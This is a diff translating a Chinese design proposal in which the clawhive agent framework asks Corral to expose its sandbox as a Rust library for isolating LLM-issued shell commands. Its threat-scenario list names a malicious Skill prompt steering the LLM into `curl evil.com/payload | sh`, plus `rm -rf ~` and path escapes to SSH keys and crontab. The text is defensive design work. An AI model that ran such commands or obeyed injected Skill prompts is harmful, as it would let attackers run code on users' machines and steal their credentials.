@@ -1,99 +1,99 @@
-# Corral 集成改进建议
+# Corral Integration Improvement Proposal
 
-> **来自**: clawhive 项目（Rust-native multi-agent framework）
-> **给到**: Corral 开发团队
-> **日期**: 2025-02-20
-> **版本**: Draft v1
+> **From**: clawhive project (Rust-native multi-agent framework)
+> **To**: Corral development team
+> **Date**: 2025-02-20
+> **Version**: Draft v1
 
 ---
 
-## 1. 应用场景
+## 1. Use Case
 
-### 1.1 clawhive 是什么
+### 1.1 What is clawhive
 
-clawhive 是一个 Rust-native 的多 Agent 框架，当前以 Telegram + CLI 为主要交互通道。核心流程：
+clawhive is a Rust-native multi-Agent framework, currently using Telegram + CLI as main interaction channels. Core flow:
 
 ```
-用户消息 → Gateway → Orchestrator → LLM (Claude/GPT)
+User message → Gateway → Orchestrator → LLM (Claude/GPT)
                                        ↓
-                                   LLM 决定调用 tools
+                                   LLM decides to call tools
                                        ↓
                                    ToolRegistry.execute()
                                        ↓
                               execute_command / read_file / write_file / ...
 ```
 
-Agent 在与用户对话时，会根据 **Skill**（能力描述）来决定使用哪些工具、执行什么操作。
+When the Agent converses with users, it decides which tools to use and what operations to execute based on **Skills** (capability descriptions).
 
-### 1.2 Skill 的形态
+### 1.2 Skill Format
 
-clawhive 的 Skill 是 **Markdown 文件 + 可选的附属脚本**，不是独立可执行程序：
+clawhive Skills are **Markdown files + optional attached scripts**, not standalone executables:
 
 ```
 skills/
 ├── web_fetch/
-│   └── SKILL.md          ← 给 LLM 看的能力描述（prompt 注入）
+│   └── SKILL.md          ← Capability description for LLM (prompt injection)
 ├── data_processor/
-│   ├── SKILL.md           ← 能力描述
+│   ├── SKILL.md           ← Capability description
 │   └── scripts/
-│       ├── process.sh     ← 附属脚本（LLM 可能通过 execute_command 调用）
-│       └── transform.py   ← 附属脚本
+│       ├── process.sh     ← Attached script (LLM may call via execute_command)
+│       └── transform.py   ← Attached script
 └── smart_shopping/
     ├── SKILL.md
-    └── run.sh             ← 附属脚本
+    └── run.sh             ← Attached script
 ```
 
-**关键点**：Skill 本身不是"被运行"的——它的 Markdown 内容被注入到 LLM 的 system prompt 中，LLM 阅读后决定如何行动。但 Skill 目录下**可能附带可执行脚本**，LLM 会通过 `execute_command` 工具来调用这些脚本。
+**Key point**: The Skill itself is not "executed" — its Markdown content is injected into LLM's system prompt, and LLM decides how to act after reading it. However, the Skill directory **may contain executable scripts**, which LLM calls through the `execute_command` tool.
 
-### 1.3 安全缺口在哪里
+### 1.3 Where the Security Gap Is
 
-当前 clawhive 的 `execute_command` 实现（`shell_tool.rs`）：
+Current clawhive `execute_command` implementation (`shell_tool.rs`):
 
 ```rust
-// 当前实现 —— 完全无沙箱
+// Current implementation — completely no sandbox
 tokio::process::Command::new("sh")
     .arg("-c")
-    .arg(&command)          // LLM 传入的任意命令
+    .arg(&command)          // Arbitrary command passed by LLM
     .current_dir(&workspace)
     .output()
 ```
 
-**威胁场景**：
+**Threat scenarios**:
 
-1. **恶意社区 Skill** — Skill 的 prompt 引导 LLM 执行 `execute_command("curl evil.com/payload | sh")`
-2. **Skill 附带的恶意脚本** — `scripts/process.sh` 里包含 `rm -rf ~` 或数据外泄操作
-3. **LLM 误操作** — LLM 理解错误，执行了超出 Skill 意图的危险命令
-4. **路径逃逸** — `read_file("../../.ssh/id_rsa")` 或 `write_file("/etc/crontab", ...)`
+1. **Malicious community Skill** — Skill's prompt guides LLM to execute `execute_command("curl evil.com/payload | sh")`
+2. **Malicious scripts attached to Skill** — `scripts/process.sh` contains `rm -rf ~` or data exfiltration operations
+3. **LLM misoperation** — LLM misunderstands and executes dangerous commands beyond Skill's intent
+4. **Path escape** — `read_file("../../.ssh/id_rsa")` or `write_file("/etc/crontab", ...)`
 
-**当前仅有的安全机制**：
+**Current security mechanisms**:
 
-| 机制 | 作用范围 | 局限 |
-|------|---------|------|
-| `tool_policy.allow` | 控制 Agent 能调用哪些 tool 名称 | 只能说"不许用 execute_command"，不能说"execute_command 只许跑 curl" |
-| `workspace` 目录 | `execute_command` 的 cwd | 不阻止命令访问 workspace 之外的文件 |
-| timeout | 限制执行时间 | 不阻止任何具体操作 |
+| Mechanism | Scope | Limitation |
+|-----------|-------|------------|
+| `tool_policy.allow` | Controls which tool names Agent can call | Can only say "don't use execute_command", can't say "execute_command only allowed to run curl" |
+| `workspace` directory | cwd for `execute_command` | Doesn't prevent command from accessing files outside workspace |
+| timeout | Limits execution time | Doesn't prevent any specific operations |
 
-**缺失的是**：对 `execute_command` **内部**执行内容的细粒度约束 — 文件访问、网络连接、进程创建。
+**What's missing**: Fine-grained constraints on what `execute_command` executes **internally** — file access, network connections, process creation.
 
-### 1.4 为什么选择 Corral
+### 1.4 Why Choose Corral
 
-我们评估了多个方案：
+We evaluated multiple solutions:
 
-| 方案 | 评估结果 |
-|------|---------|
-| **WASM (wasmtime/wasmer)** | 不能直接跑 bash/python 脚本，需要编译到 WASI，对 `sh -c curl` 场景不友好 |
-| **容器 (Docker/Podman)** | 每次 tool call 起容器，延迟不可接受（秒级 vs 毫秒级） |
-| **macOS sandbox-exec** | 单平台，且 API 已 deprecated |
-| **seccomp-bpf** | Linux only，配置复杂，无高层抽象 |
-| **Corral** | 专为 Agent Skill 设计，capability-based，Rust 技术栈一致，跨平台 |
+| Solution | Evaluation Result |
+|----------|-------------------|
+| **WASM (wasmtime/wasmer)** | Can't directly run bash/python scripts, needs to compile to WASI, not friendly for `sh -c curl` scenarios |
+| **Containers (Docker/Podman)** | Starting container per tool call, latency unacceptable (seconds vs milliseconds) |
+| **macOS sandbox-exec** | Single platform, and API already deprecated |
+| **seccomp-bpf** | Linux only, complex configuration, no high-level abstraction |
+| **Corral** | Designed specifically for Agent Skills, capability-based, consistent Rust tech stack, cross-platform |
 
-Corral 是唯一一个**在正确的抽象层解决问题**的方案：它理解"Skill"的概念，提供声明式权限，且隔离机制对脚本解释器有效。
+Corral is the only solution that **solves the problem at the right abstraction layer**: it understands the "Skill" concept, provides declarative permissions, and isolation mechanism works on script interpreters.
 
 ---
 
-## 2. 当前 Corral 架构与集成差距分析
+## 2. Current Corral Architecture and Integration Gap Analysis
 
-### 2.1 Corral 当前架构（我们的理解）
+### 2.1 Current Corral Architecture (Our Understanding)
 
 ```
                  corral CLI
@@ -102,110 +102,110 @@ Corral 是唯一一个**在正确的抽象层解决问题**的方案：它理解
           ▼          ▼          ▼
        run        inspect    approve
           │
-          ├── Manifest::load(skill_path)     从 skill.yaml 读取权限声明
-          ├── PolicyEngine::new(manifest)     构建策略引擎
-          ├── platform::create_runtime()      创建平台特定的隔离运行时
-          ├── broker::start_broker(policy)    启动 JSON-RPC broker
-          ├── runtime.execute(&broker)        在沙箱中执行 skill entry point
-          └── audit::log_execution()          记录审计日志
+          ├── Manifest::load(skill_path)     Read permission declaration from skill.yaml
+          ├── PolicyEngine::new(manifest)     Build policy engine
+          ├── platform::create_runtime()      Create platform-specific isolated runtime
+          ├── broker::start_broker(policy)    Start JSON-RPC broker
+          ├── runtime.execute(&broker)        Execute skill entry point in sandbox
+          └── audit::log_execution()          Log audit trail
 ```
 
-这个架构的设计假设是：**一个完整的 Skill 脚本，从头到尾在沙箱里跑完**。
+This architecture assumes: **A complete Skill script runs from start to finish inside sandbox**.
 
-### 2.2 集成差距
+### 2.2 Integration Gap
 
-clawhive 的使用模式与 Corral 当前假设的差异：
+Differences between clawhive's usage pattern and Corral's current assumptions:
 
-| 维度 | Corral 当前假设 | clawhive 实际需求 |
-|------|----------------|------------------|
-| **调用粒度** | 整个 Skill 脚本从 entry point 启动到结束 | LLM 发起的**单次命令执行**（每次 `execute_command` 调用） |
-| **调用方式** | CLI (`corral run --skill ./path`) | Rust 库调用（`ExecuteCommandTool` 内部直接调 API） |
-| **权限来源** | `skill.yaml` 文件 | clawhive 的 `SKILL.md` frontmatter 或 agent config |
-| **生命周期** | 一次性：创建沙箱 → 执行 → 销毁 | 会话式：一个 Skill 激活期间，LLM 可能发起多次沙箱执行 |
-| **Broker 需求** | 必需（脚本通过 sandbox-call 与 Broker 通信） | 可选（clawhive 的 tool 系统已经提供了类似的能力代理） |
-| **权限构建** | 从 YAML 文件解析 | 从代码中程序化构建（可能融合多个来源：skill + agent config + global policy） |
+| Dimension | Corral Current Assumption | clawhive Actual Need |
+|-----------|--------------------------|---------------------|
+| **Call granularity** | Entire Skill script from entry point to end | **Single command execution** initiated by LLM (each `execute_command` call) |
+| **Call method** | CLI (`corral run --skill ./path`) | Rust library call (`ExecuteCommandTool` internally calls API directly) |
+| **Permission source** | `skill.yaml` file | clawhive's `SKILL.md` frontmatter or agent config |
+| **Lifecycle** | One-shot: create sandbox → execute → destroy | Session-based: during one Skill activation, LLM may initiate multiple sandbox executions |
+| **Broker requirement** | Required (scripts communicate with Broker via sandbox-call) | Optional (clawhive's tool system already provides similar capability proxy) |
+| **Permission construction** | Parsed from YAML file | Programmatically constructed from code (may combine multiple sources: skill + agent config + global policy) |
 
-### 2.3 具体的技术差距
+### 2.3 Specific Technical Gaps
 
-**差距 1：没有 Library Crate**
+**Gap 1: No Library Crate**
 
-Corral 当前只有两个 workspace member：`corral`（CLI binary）和 `sdk/sandbox-call`。所有沙箱核心逻辑（policy engine、platform runtime、broker）都在 `corral` 这个 binary crate 里。
+Corral currently only has two workspace members: `corral` (CLI binary) and `sdk/sandbox-call`. All sandbox core logic (policy engine, platform runtime, broker) is in the `corral` binary crate.
 
-clawhive 无法 `cargo` 依赖一个 binary crate。需要把核心逻辑拆到独立的 library crate 中。
+clawhive cannot `cargo` depend on a binary crate. Need to extract core logic into standalone library crate.
 
-**差距 2：`PolicyEngine` 只接受 `Manifest` 整体**
+**Gap 2: `PolicyEngine` Only Accepts Complete `Manifest`**
 
 ```rust
-// 当前 corral 的 PolicyEngine
+// Current corral PolicyEngine
 impl PolicyEngine {
     pub fn new(manifest: Manifest) -> Self { ... }
 }
 ```
 
-`Manifest` 包含 `name`、`version`、`author`、`entry`、`runtime` 等与权限无关的字段。下游集成者只关心 `Permissions` 部分，不需要也不应该伪造一个完整的 `Manifest`。
+`Manifest` contains `name`, `version`, `author`, `entry`, `runtime` and other fields unrelated to permissions. Downstream integrators only care about the `Permissions` part, shouldn't need to fake a complete `Manifest`.
 
-**差距 3：`Runtime` trait 绑定了完整的执行流程**
+**Gap 3: `Runtime` Trait Binds Complete Execution Flow**
 
 ```rust
-// 当前 corral 的 Runtime trait
+// Current corral Runtime trait
 #[async_trait]
 pub trait Runtime {
     async fn execute(&self, broker: &BrokerHandle) -> Result<ExecutionResult>;
 }
 ```
 
-这个 trait 假设"执行"是"跑一个 entry point 脚本"。clawhive 需要的是"在沙箱约束下执行一条任意命令"。
+This trait assumes "execute" means "run an entry point script". clawhive needs "execute an arbitrary command under sandbox constraints".
 
-**差距 4：沙箱每次从头创建**
+**Gap 4: Sandbox Created From Scratch Each Time**
 
-`MacOSRuntime::new()` 每次调用都会 `create_dir_all(work_dir)`，`execute()` 结束时 `remove_dir_all(work_dir)`。如果 LLM 在一个对话里连续发起 10 次 `execute_command`，当前架构要创建/销毁 10 次沙箱环境。
+`MacOSRuntime::new()` calls `create_dir_all(work_dir)` each time, `execute()` calls `remove_dir_all(work_dir)` when done. If LLM initiates 10 `execute_command` calls in one conversation, current architecture creates/destroys sandbox environment 10 times.
 
-**差距 5：Broker 是强依赖**
+**Gap 5: Broker is Hard Dependency**
 
-`runtime.execute(&broker)` 签名要求必须有 `BrokerHandle`。但 clawhive 已经有自己的 tool 系统（`ToolRegistry`），提供了 `web_fetch`、`memory_search`、`read_file` 等能力。对于 clawhive 来说，Corral 的 Broker 服务代理是**可选的增值功能**，不应该是沙箱执行的前置条件。
+`runtime.execute(&broker)` signature requires `BrokerHandle`. But clawhive already has its own tool system (`ToolRegistry`), providing `web_fetch`, `memory_search`, `read_file` and other capabilities. For clawhive, Corral's Broker service proxy is **optional value-add**, shouldn't be prerequisite for sandbox execution.
 
 ---
 
-## 3. 核心改进建议
+## 3. Core Improvement Suggestions
 
-### 3.1 建议一：拆出 `corral-core` Library Crate
+### 3.1 Suggestion 1: Extract `corral-core` Library Crate
 
-**目标**：让 Corral 的沙箱能力可以被其他 Rust 项目作为库依赖使用。
+**Goal**: Make Corral's sandbox capabilities usable as library dependency by other Rust projects.
 
-**改动**：
+**Changes**:
 
 ```
 corral/
 ├── Cargo.toml                    # workspace
-├── corral/                       # CLI binary（保持不变，依赖 corral-core）
+├── corral/                       # CLI binary (unchanged, depends on corral-core)
 │   ├── Cargo.toml
 │   └── src/main.rs
-├── corral-core/                  # ← 新增：核心库
+├── corral-core/                  # ← NEW: core library
 │   ├── Cargo.toml
 │   └── src/
 │       ├── lib.rs
-│       ├── policy.rs             # PolicyEngine（从 corral/ 移入）
-│       ├── manifest.rs           # Manifest + Permissions 类型（从 corral/ 移入）
-│       ├── sandbox.rs            # ← 新增：沙箱执行 API
+│       ├── policy.rs             # PolicyEngine (moved from corral/)
+│       ├── manifest.rs           # Manifest + Permissions types (moved from corral/)
+│       ├── sandbox.rs            # ← NEW: sandbox execution API
 │       ├── platform/
 │       │   ├── mod.rs
-│       │   ├── macos.rs          # 从 corral/ 移入
-│       │   └── linux.rs          # 从 corral/ 移入
-│       ├── broker/               # 从 corral/ 移入（可选功能）
-│       └── audit.rs              # 从 corral/ 移入
-├── libsandbox/                   # 不变
-└── sdk/sandbox-call/             # 不变
+│       │   ├── macos.rs          # Moved from corral/
+│       │   └── linux.rs          # Moved from corral/
+│       ├── broker/               # Moved from corral/ (optional feature)
+│       └── audit.rs              # Moved from corral/
+├── libsandbox/                   # Unchanged
+└── sdk/sandbox-call/             # Unchanged
 ```
 
-`corral` CLI 变成 `corral-core` 的薄封装：
+`corral` CLI becomes thin wrapper around `corral-core`:
 
 ```rust
-// corral/src/main.rs（改动后）
+// corral/src/main.rs (after change)
 use corral_core::{Manifest, PolicyEngine, SandboxBuilder};
-// CLI 逻辑调用 corral_core 的公共 API
+// CLI logic calls corral_core public APIs
 ```
 
-**Cargo.toml 示例**：
+**Cargo.toml example**:
 
 ```toml
 # corral-core/Cargo.toml
@@ -217,20 +217,20 @@ version = "0.2.0"
 default = ["sandbox-macos", "sandbox-linux"]
 sandbox-macos = []
 sandbox-linux = []
-broker = ["tokio/net"]   # Broker 作为可选 feature
+broker = ["tokio/net"]   # Broker as optional feature
 
 [dependencies]
-# ... 核心依赖
+# ... core dependencies
 ```
 
-### 3.2 建议二：提供 `SandboxBuilder` API — 沙箱的程序化构建
+### 3.2 Suggestion 2: Provide `SandboxBuilder` API — Programmatic Sandbox Construction
 
-**目标**：让集成者用代码而非 YAML 文件构建沙箱策略，支持灵活组合。
+**Goal**: Let integrators build sandbox policies with code rather than YAML files, support flexible composition.
 
-**设计**：
+**Design**:
 
 ```rust
-/// 沙箱构建器 — corral-core 的核心 API
+/// Sandbox builder — corral-core's core API
 pub struct SandboxBuilder {
     permissions: Permissions,
     work_dir: Option<PathBuf>,
@@ -242,60 +242,60 @@ pub struct SandboxBuilder {
 }
 
 impl SandboxBuilder {
-    /// 从零开始构建（default deny）
+    /// Build from scratch (default deny)
     pub fn new() -> Self;
 
-    /// 从已有的 Permissions 构建
+    /// Build from existing Permissions
     pub fn from_permissions(perms: Permissions) -> Self;
 
-    /// 从 skill.yaml / SKILL.md 的权限声明构建
+    /// Build from skill.yaml / SKILL.md permission declarations
     pub fn from_manifest(manifest: &Manifest) -> Self;
 
-    // --- 权限配置（Builder pattern）---
+    // --- Permission configuration (Builder pattern) ---
 
-    /// 允许读取指定路径（glob pattern）
+    /// Allow reading specified paths (glob pattern)
     pub fn allow_fs_read(mut self, patterns: &[&str]) -> Self;
 
-    /// 允许写入指定路径（glob pattern）
+    /// Allow writing specified paths (glob pattern)
     pub fn allow_fs_write(mut self, patterns: &[&str]) -> Self;
 
-    /// 允许访问指定网络地址
+    /// Allow accessing specified network addresses
     pub fn allow_network(mut self, hosts: &[&str]) -> Self;
 
-    /// 允许执行指定命令
+    /// Allow executing specified commands
     pub fn allow_exec(mut self, commands: &[&str]) -> Self;
 
-    /// 允许访问指定环境变量
+    /// Allow accessing specified environment variables
     pub fn allow_env(mut self, vars: &[&str]) -> Self;
 
-    /// 合并另一组权限（用于叠加 skill + agent + global 策略）
+    /// Merge another set of permissions (for layering skill + agent + global policies)
     pub fn merge_permissions(mut self, additional: &Permissions) -> Self;
 
-    // --- 资源限制 ---
+    // --- Resource limits ---
 
     pub fn timeout(mut self, duration: Duration) -> Self;
     pub fn memory_limit(mut self, bytes: usize) -> Self;
     pub fn work_dir(mut self, path: PathBuf) -> Self;
 
-    // --- 可选组件 ---
+    // --- Optional components ---
 
-    /// 启用 Broker（系统服务代理）
+    /// Enable Broker (system service proxy)
     pub fn with_broker(mut self, config: BrokerConfig) -> Self;
 
-    /// 启用审计日志
+    /// Enable audit logging
     pub fn with_audit(mut self, config: AuditConfig) -> Self;
 
-    // --- 构建 ---
+    // --- Build ---
 
-    /// 构建沙箱实例
+    /// Build sandbox instance
     pub fn build(self) -> Result<Sandbox>;
 }
 ```
 
-**使用示例（clawhive 集成）**：
+**Usage example (clawhive integration)**:
 
 ```rust
-// clawhive 的 ExecuteCommandTool 内部
+// Inside clawhive's ExecuteCommandTool
 let sandbox = SandboxBuilder::new()
     .allow_fs_read(&["$SKILL_DIR/**"])
     .allow_fs_write(&["$WORK_DIR/**"])
@@ -308,14 +308,14 @@ let sandbox = SandboxBuilder::new()
 let result = sandbox.execute("curl -s https://api.example.com/data | jq .").await?;
 ```
 
-### 3.3 建议三：`Sandbox` 实例支持复用（会话式沙箱）
+### 3.3 Suggestion 3: `Sandbox` Instance Supports Reuse (Session-based Sandbox)
 
-**目标**：一个 Skill 激活期间，多次 `execute_command` 复用同一个沙箱上下文。
+**Goal**: During one Skill activation, multiple `execute_command` calls reuse same sandbox context.
 
-**设计**：
+**Design**:
 
 ```rust
-/// 沙箱实例 — 可复用
+/// Sandbox instance — reusable
 pub struct Sandbox {
     policy: PolicyEngine,
     platform: Box<dyn PlatformSandbox>,
@@ -325,124 +325,124 @@ pub struct Sandbox {
 }
 
 impl Sandbox {
-    /// 执行单条命令（核心 API）
+    /// Execute single command (core API)
     pub async fn execute(&self, command: &str) -> Result<ExecutionResult>;
 
-    /// 执行指定脚本文件
+    /// Execute specified script file
     pub async fn execute_script(&self, script_path: &Path) -> Result<ExecutionResult>;
 
-    /// 执行完整的 skill entry point（兼容当前 corral CLI 的用法）
+    /// Execute complete skill entry point (compatible with current corral CLI usage)
     pub async fn run_skill_entry(&self, entry: &str, runtime: &str) -> Result<ExecutionResult>;
 
-    /// 获取审计统计
+    /// Get audit statistics
     pub fn stats(&self) -> SandboxStats;
 }
 
 impl Drop for Sandbox {
     fn drop(&mut self) {
-        // 清理 work_dir、关闭 broker socket、flush audit log
+        // Clean up work_dir, close broker socket, flush audit log
     }
 }
 ```
 
-**生命周期对比**：
+**Lifecycle comparison**:
 
 ```
-当前 Corral（一次性）：
-  create_runtime() → execute() → cleanup()  ← 每次都走完整流程
+Current Corral (one-shot):
+  create_runtime() → execute() → cleanup()  ← Full flow each time
 
-建议的会话式：
-  Sandbox::build()                           ← 一次创建
-    ├── sandbox.execute("curl ...")           ← 复用
-    ├── sandbox.execute("jq ...")             ← 复用
-    ├── sandbox.execute("python3 process.py") ← 复用
-    └── drop                                 ← 一次清理
+Suggested session-based:
+  Sandbox::build()                           ← Create once
+    ├── sandbox.execute("curl ...")           ← Reuse
+    ├── sandbox.execute("jq ...")             ← Reuse
+    ├── sandbox.execute("python3 process.py") ← Reuse
+    └── drop                                 ← Clean up once
 ```
 
-### 3.4 建议四：`PolicyEngine` 与 `Manifest` 解耦
+### 3.4 Suggestion 4: Decouple `PolicyEngine` from `Manifest`
 
-**目标**：`PolicyEngine` 应该只关心 `Permissions`，不依赖完整的 `Manifest`。
+**Goal**: `PolicyEngine` should only care about `Permissions`, not depend on complete `Manifest`.
 
-**改动**：
+**Changes**:
 
 ```rust
-// 当前
+// Current
 impl PolicyEngine {
     pub fn new(manifest: Manifest) -> Self {
         Self { manifest: Arc::new(manifest) }
     }
 }
 
-// 建议
+// Suggested
 impl PolicyEngine {
-    /// 从 Permissions 直接构建
+    /// Build directly from Permissions
     pub fn new(permissions: Permissions) -> Self {
         Self { permissions: Arc::new(permissions) }
     }
 
-    /// 从 Manifest 构建（便捷方法）
+    /// Build from Manifest (convenience method)
     pub fn from_manifest(manifest: &Manifest) -> Self {
         Self::new(manifest.permissions.clone())
     }
 }
 ```
 
-同时，`Permissions` 类型应该支持合并：
+Also, `Permissions` type should support merging:
 
 ```rust
 impl Permissions {
-    /// 合并两组权限（取并集 — 更多权限）
+    /// Merge two permission sets (union — more permissions)
     pub fn merge(&self, other: &Permissions) -> Permissions;
 
-    /// 取交集（更少权限 — 用于 global policy 限制）
+    /// Intersect (fewer permissions — for global policy restrictions)
     pub fn intersect(&self, other: &Permissions) -> Permissions;
 
-    /// 从 YAML 字符串解析
+    /// Parse from YAML string
     pub fn from_yaml(yaml: &str) -> Result<Self>;
 
-    /// 判断是否为空（default deny 状态）
+    /// Check if empty (default deny state)
     pub fn is_empty(&self) -> bool;
 }
 ```
 
-**为什么需要合并**：clawhive 的权限可能来自多层：
+**Why merging is needed**: clawhive permissions may come from multiple layers:
 
 ```
-最终权限 = skill 声明 ∩ agent 策略 ∩ global 策略
+Final permission = skill declaration ∩ agent policy ∩ global policy
 
-skill 声明:   network: [api.example.com:443, cdn.example.com:443]
-agent 策略:   network: [*.example.com:443]          ← agent 级别的限制
-global 策略:  network: [*:443]                       ← 全局只允许 HTTPS
-─────────────────────────────────────────────────
-最终:         network: [api.example.com:443, cdn.example.com:443]
+skill declaration:  network: [api.example.com:443, cdn.example.com:443]
+agent policy:       network: [*.example.com:443]          ← agent level restriction
+global policy:      network: [*:443]                       ← global only allows HTTPS
+─────────────────────────────────────────────────────
+Final:              network: [api.example.com:443, cdn.example.com:443]
 ```
 
-### 3.5 建议五：`PlatformSandbox` trait 重构 — 区分"沙箱环境"和"执行"
+### 3.5 Suggestion 5: Refactor `PlatformSandbox` Trait — Separate "Sandbox Environment" and "Execution"
 
-**目标**：将"创建沙箱环境"和"在沙箱中执行命令"分离。
+**Goal**: Separate "creating sandbox environment" and "executing command in sandbox".
 
-**当前设计问题**：
+**Current design problem**:
 
 ```rust
-// 当前 Runtime trait — 创建和执行绑在一起
+// Current Runtime trait — creation and execution bound together
 pub trait Runtime {
     async fn execute(&self, broker: &BrokerHandle) -> Result<ExecutionResult>;
 }
 
-// MacOSRuntime::new() 在构造时就创建了 work_dir
-// MacOSRuntime::execute() 在执行后就删除了 work_dir
+// MacOSRuntime::new() creates work_dir during construction
+// MacOSRuntime::execute() deletes work_dir after execution
 ```
 
-**建议的重构**：
+**Suggested refactoring**:
 
 ```rust
-/// 平台沙箱能力抽象
+/// Platform sandbox capability abstraction
 #[async_trait]
 pub trait PlatformSandbox: Send + Sync {
-    /// 准备沙箱环境（创建目录、准备 libsandbox 等）
+    /// Prepare sandbox environment (create directories, prepare libsandbox, etc.)
     async fn setup(&mut self, config: &SandboxConfig) -> Result<()>;
 
-    /// 在沙箱中执行命令
+    /// Execute command in sandbox
     async fn execute_command(
         &self,
         command: &str,
@@ -450,7 +450,7 @@ pub trait PlatformSandbox: Send + Sync {
         env: &HashMap<String, String>,
     ) -> Result<ExecutionResult>;
 
-    /// 在沙箱中执行脚本
+    /// Execute script in sandbox
     async fn execute_script(
         &self,
         script: &Path,
@@ -459,25 +459,25 @@ pub trait PlatformSandbox: Send + Sync {
         env: &HashMap<String, String>,
     ) -> Result<ExecutionResult>;
 
-    /// 清理沙箱环境
+    /// Clean up sandbox environment
     async fn teardown(&mut self) -> Result<()>;
 
-    /// 平台名称（用于日志/审计）
+    /// Platform name (for logging/audit)
     fn platform_name(&self) -> &str;
 }
 ```
 
-### 3.6 建议六：Broker 作为可选组件
+### 3.6 Suggestion 6: Broker as Optional Component
 
-**目标**：沙箱执行不应该强依赖 Broker。Broker 应该是一个可选增强。
+**Goal**: Sandbox execution shouldn't hard-depend on Broker. Broker should be optional enhancement.
 
-**原因**：
+**Reasons**:
 
-1. clawhive 已经有自己的 `ToolRegistry`，提供了文件读写、网络请求、内存搜索等能力。这些能力是 LLM 通过 tool call 触发的，不需要脚本通过 `sandbox-call` 来请求。
+1. clawhive already has its own `ToolRegistry`, providing file read/write, network requests, memory search and other capabilities. These capabilities are triggered by LLM via tool calls, don't need scripts to request via `sandbox-call`.
 
-2. 但是，如果 Skill 的脚本需要调用系统服务（日历、提醒事项、通知），Broker 就有价值了 — 它提供了 clawhive 当前没有的能力。
+2. However, if Skill's script needs to call system services (calendar, reminders, notifications), Broker has value — it provides capabilities clawhive doesn't currently have.
 
-**建议的模块化**：
+**Suggested modularization**:
 
 ```toml
 # corral-core/Cargo.toml
@@ -485,92 +485,92 @@ pub trait PlatformSandbox: Send + Sync {
 default = ["platform-macos", "platform-linux"]
 platform-macos = []
 platform-linux = []
-broker = ["tokio/net"]           # 可选：启用 Broker
-services-reminders = ["broker"]  # 可选：提醒事项 adapter
-services-calendar = ["broker"]   # 可选：日历 adapter
-services-browser = ["broker"]    # 可选：浏览器 adapter
-audit = []                       # 可选：审计日志
+broker = ["tokio/net"]           # Optional: enable Broker
+services-reminders = ["broker"]  # Optional: reminders adapter
+services-calendar = ["broker"]   # Optional: calendar adapter
+services-browser = ["broker"]    # Optional: browser adapter
+audit = []                       # Optional: audit logging
 full = ["broker", "services-reminders", "services-calendar", "services-browser", "audit"]
 ```
 
 ```rust
-// 不需要 Broker 的用法
+// Usage without Broker
 let sandbox = SandboxBuilder::new()
     .allow_exec(&["curl"])
     .allow_network(&["api.example.com:443"])
-    .build()?;    // 只有沙箱隔离，没有 Broker
+    .build()?;    // Only sandbox isolation, no Broker
 
-// 需要 Broker 的用法
+// Usage with Broker
 let sandbox = SandboxBuilder::new()
     .allow_exec(&["curl"])
     .with_broker(BrokerConfig {
         services: vec![ServiceConfig::Reminders { ... }],
     })
-    .build()?;    // 沙箱隔离 + Broker 系统服务代理
+    .build()?;    // Sandbox isolation + Broker system service proxy
 ```
 
-### 3.7 建议七：libsandbox 策略注入方式改进
+### 3.7 Suggestion 7: Improve libsandbox Policy Injection Method
 
-**当前实现**：
+**Current implementation**:
 
 ```rust
-// macos.rs — 通过环境变量传递 JSON 策略
+// macos.rs — Pass JSON policy via environment variable
 cmd.env("SANDBOX_POLICY", policy_json);
 ```
 
 ```c
-// interpose_macos.c — 从环境变量加载策略
-// policy_init() 读取 SANDBOX_POLICY 环境变量
+// interpose_macos.c — Load policy from environment variable
+// policy_init() reads SANDBOX_POLICY environment variable
 ```
 
-**问题**：环境变量有长度限制（macOS 约 256KB，Linux 约 128KB），复杂策略可能超限。另外，环境变量对子进程可见，存在泄露风险。
+**Problems**: Environment variables have length limits (~256KB on macOS, ~128KB on Linux), complex policies may exceed. Also, environment variables are visible to child processes, leak risk.
 
-**建议**：
+**Suggestions**:
 
-1. **主路径**：通过文件描述符传递（`/proc/self/fd/N` 或 macOS pipe）
-2. **备选路径**：写入临时文件，通过环境变量传递文件路径（`SANDBOX_POLICY_FILE=/tmp/corral-policy-xxx.json`），执行后立即删除
-3. **保留**：当前环境变量方式作为 fallback，因为简单且适用于简短策略
+1. **Primary path**: Pass via file descriptor (`/proc/self/fd/N` or macOS pipe)
+2. **Fallback path**: Write to temp file, pass file path via env var (`SANDBOX_POLICY_FILE=/tmp/corral-policy-xxx.json`), delete immediately after execution
+3. **Keep**: Current env var method as fallback, since it's simple and works for short policies
 
 ```c
-// 建议的 policy.c 改动
+// Suggested policy.c change
 void policy_init(void) {
-    // 优先从文件描述符读取
+    // Prefer reading from file descriptor
     const char *fd_str = getenv("SANDBOX_POLICY_FD");
     if (fd_str) {
         int fd = atoi(fd_str);
-        // 从 fd 读取 JSON 策略
+        // Read JSON policy from fd
         policy_load_from_fd(fd);
         return;
     }
 
-    // 其次从文件读取
+    // Second, read from file
     const char *file = getenv("SANDBOX_POLICY_FILE");
     if (file) {
         policy_load_from_file(file);
         return;
     }
 
-    // 兜底从环境变量读取
+    // Fallback to environment variable
     const char *json = getenv("SANDBOX_POLICY");
     if (json) {
         policy_load_from_json(json);
         return;
     }
 
-    // 无策略 = 全部拒绝
+    // No policy = deny all
     policy_deny_all();
 }
 ```
 
 ---
 
-## 4. 集成示意（clawhive 视角）
+## 4. Integration Example (clawhive Perspective)
 
-展示 clawhive 如何使用改进后的 Corral：
+Demonstrating how clawhive uses improved Corral:
 
-### 4.1 Skill 权限声明
+### 4.1 Skill Permission Declaration
 
-SKILL.md 的 frontmatter 扩展（兼容现有格式）：
+SKILL.md frontmatter extension (compatible with existing format):
 
 ```yaml
 # skills/web_fetch/SKILL.md
@@ -580,7 +580,7 @@ description: Fetch web content via curl
 requires:
   bins: [curl]
   env: []
-permissions:                      # ← 新增，Corral 消费
+permissions:                      # ← NEW, consumed by Corral
   fs:
     read: [$SKILL_DIR/**]
     write: [$WORK_DIR/**]
@@ -594,21 +594,21 @@ permissions:                      # ← 新增，Corral 消费
 ...
 ```
 
-### 4.2 clawhive 内部集成
+### 4.2 clawhive Internal Integration
 
 ```rust
-// clawhive-core/src/shell_tool.rs（改造后）
+// clawhive-core/src/shell_tool.rs (after modification)
 
 use corral_core::{Sandbox, SandboxBuilder, Permissions};
 
 pub struct ExecuteCommandTool {
     workspace: PathBuf,
     default_timeout: u64,
-    sandbox: Option<Sandbox>,   // ← 新增：当前活跃的沙箱
+    sandbox: Option<Sandbox>,   // ← NEW: currently active sandbox
 }
 
 impl ExecuteCommandTool {
-    /// 当 Skill 激活时，根据其 permissions 创建沙箱
